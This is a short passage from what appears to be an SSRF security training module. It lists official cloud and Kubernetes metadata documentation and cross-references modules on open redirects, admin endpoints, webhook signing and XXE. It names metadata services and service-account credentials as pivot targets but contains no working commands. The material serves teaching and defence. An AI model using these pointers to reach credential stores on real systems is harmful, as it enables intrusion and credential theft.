- AWS EC2 Instance Metadata Service configuration and IMDSv2 enforcement — <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html>
- GCP Compute Metadata querying (`Metadata-Flavor: Google`) — <https://cloud.google.com/compute/docs/metadata/querying-metadata>
- Azure Instance Metadata Service (headers and `api-version`) — <https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service>
- Kubernetes: access the API from a pod (serviceaccount credentials path) — <https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/>

### Cross-Module References

- AUTHN module: OAuth/OIDC `redirect_uri` validation gaps that open redirects chain into.
- CONFIG module: actuator/admin endpoint exposure that determines internal-pivot impact.
- CRYPTO module: webhook HMAC signing design that closes the SSRF-plus-replay chain.
- DESER module: XXE-based internal fetches sharing this module's network pivot targets.
